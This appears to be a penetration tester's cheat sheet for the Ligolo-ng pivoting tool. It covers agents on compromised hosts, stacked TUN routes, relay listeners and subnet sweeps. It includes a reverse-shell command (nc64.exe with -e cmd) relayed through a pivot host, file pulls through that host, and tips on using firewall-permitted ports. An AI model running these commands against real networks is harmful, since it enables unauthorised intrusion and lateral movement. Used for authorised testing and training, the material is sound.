**Overview:**
 
Ligolo-ng is a tunneling/pivoting tool that gives **routable access** to networks behind a compromised host, without proxychains. It has two parts:

- **Proxy**: runs on the Kali host. This is the server that agents connect back to, and where tunnels/routes are controlled from an interactive console.
- **Agent**: a small binary dropped on the compromised target. It connects back to the proxy and acts as the relay for traffic.

Instead of SOCKS-proxying each tool individually, Ligolo creates a **TUN interface** on the Kali machine (e.g. `tunnel1`). Once a route is added on Kali pointing a target subnet at that TUN interface, the traffic is transparently encapsulated, sent through the agent, and executed into the real network on the other side so `nmap`, `netexec`, `smbclient`, can be run **natively**, like the Kali host is sitting on that subnet.

Each pivot is a separate layer, and each layer gets its **own TUN interface and its own route** on Kali:

```
Kali (10.10.14.14) TUN0 
   │
   │  agent1 connects back to 10.10.14.14:11601
   ▼
Target 1 (dual-homed foothold)
   External IP: 10.10.10.5   ← reachable from Kali via TUN0
   Internal IP: 172.16.5.10  ← reachable only from Target 1 itself
   │
   │  route added: 172.16.5.0/24 dev tunnel1  (Layer 1)
   │
   │  agent2 (on Target 2) connects back to Target 1's internal IP
   │  because Target 1 is now acting as a relay for that subnet
   ▼
Target 2 (second pivot)
   External/reachable IP: 172.16.5.20 (reachable via tunnel1)
   Internal IP: 172.16.6.15 deeper subnet, invisible from Kali directly
   │
   │  route added: 172.16.6.0/24 dev tunnel2  (Layer 2)
   ▼
Subnet only Target 2 can see
```

**Layer 1** = direct pivot (Kali ↔ Target 1's internal network).   
**Layer 2** = a pivot-through-a-pivot (Kali → tunnel1 → Target 1 → Target 2's internal network via tunnel2). 
Each new layer needs: a new TUN device, a new agent connecting to the _previous hop's_ reachable IP (not directly to Kali), a `start --tun` in the proxy console, and a new `ip route add` on Kali. Traffic for the deepest subnet transparently rides through every TUN interface stacked on top of it.

---
## 1st Pivot on 1st internal range

**1. Start the Ligolo proxy server on Kali**

```bash
sudo ligolo-proxy -selfcert
```

Launches the console and listens for incoming agent connections (self-signed TLS).

**2. Run the agent on Target 1, connecting back to Kali's TUN0 IP**

> **Windows**

```powershell
.\agent.exe -connect 10.10.14.14:11601 -ignore-cert
```

> **Linux**

```bash
./agent -connect 10.10.14.14:11601 -ignore-cert
```

The agent phones home to the proxy over the VPN-reachable external IP, establishing Layer 1.

**3. Select the new session in the proxy console**

```
ligolo-ng » session
```

Pick the agent that just connected from the list.

**4. Run `autoroute`**

```
[Agent : Target1] » autoroute
```

This reads the agent's network interfaces/routing table, displays the subnets it can see (e.g. `172.16.5.0/24`), and interactively:

- prompts for which subnet(s) to route,
- creates a TUN interface on Kali (random name, or a chosen one),
- adds the matching `ip route`,
- starts the tunnel.

**5. Manual fallback, if `autoroute` fails or full manual control is preferred**

```bash
# On Kali
sudo ip tuntap add user $(whoami) mode tun tunnel1
sudo ip link set tunnel1 up
sudo ip route add 172.16.5.0/24 dev tunnel1
```

```
# In the proxy console, with the Target 1 session selected
start --tun tunnel1
```

**6. Add a listener on the tunnel, for the next hop**

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Opens a listening port **inside** Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to the local proxy port. This is what lets a second agent (deeper in the network) dial back in.

**7. Verify reachability**

```bash
netexec smb 172.16.5.0/24
```

Confirms the route/tunnel works by sweeping SMB across the newly reachable subnet.

---

## 2nd Pivot on 2nd internal range

**1. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**

powershell

```powershell
.\agent.exe -connect 172.16.5.10:11601 -ignore-cert
```

Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened in step 6 above, which proxies the connection back to the Ligolo console.

**2. Select the new agent session and run `autoroute` again**

```
ligolo-ng » session
[Agent : Target2] » autoroute
```

Select the Target 2 subnet (e.g. `172.16.6.0/24`). This creates a _second_ TUN interface (`tunnel2`), adds the route, and starts Layer 2 — automatically stacked on top of Layer 1.

**Manual fallback:**

bash

```bash
sudo ip tuntap add user $(whoami) mode tun tunnel2
sudo ip link set tunnel2 up
sudo ip route add 172.16.6.0/24 dev tunnel2
```

```
start --tun tunnel2
```

**3. Add listeners for commonly-whitelisted ports (port forwarding step)**

```
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali — useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.

**4. Pull a file from Kali through Target 1's internal IP**

powershell

```powershell
wget http://172.16.5.10/file -outfile file
```

Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever is being hosted on Kali (e.g. `python3 -m http.server`).

**5. Catch a reverse shell from Target 2**

powershell

```powershell
nc64.exe 172.16.5.10 443 -e cmd
```

Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to the local `nc` listener on Kali.

**6. Verify reachability on the second subnet**

bash

```bash
netexec smb 172.16.6.0/24
```

Confirms Layer 2 is working end-to-end.

---

## Local Port Forwarding to Kali (the `240.0.0.1` trick)

Used when only one internal-only service/port on the agent's own loopback (e.g. an internal web app bound to `127.0.0.1`) needs to be reachable directly from a Kali tool or Firefox.

**1. Connect the agent to the proxy**

powershell

```powershell
.\agent.exe -connect 10.10.14.14:11601 -ignore-cert
```

**2. Create the interface and route**

Either let `autoroute` handle it, or do it manually:

bash

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

```
start --tun ligolo
```

`240.0.0.1` is a special Ligolo address representing "the agent's localhost." Any port the agent can reach on `127.0.0.1` (its own loopback) becomes reachable from Kali at `240.0.0.1`, with no proxychains required.

**3. Verify with Nmap**

bash

```bash
nmap -p- 240.0.0.1
```

---

## Listener management (v0.8+)

```
listener_list                                       # list all active listeners/relays
listener_stop --id <id>                             # tear down a specific listener
listener_add --addr 0.0.0.0:1080 --to 127.0.0.1 --socks5   # stand up a SOCKS5 listener instead of a plain TCP/UDP relay
listener_add --addr 0.0.0.0:53 --to 127.0.0.1:53 --udp     # explicit UDP relay (default is TCP)
```

---

## Other useful console commands (v0.8+)

```
session              # list/select agent sessions
autoroute            # auto-discover + create interface/route/tunnel for the selected session
ifconfig             # show the selected agent's network interfaces (handy before deciding what to route)
interface_create --name ligolo   # create a TUN interface from inside the console, instead of ip tuntap
tunnel_list          # show active tunnels and which session/interface they're bound to
kill                 # remotely terminate the selected agent
```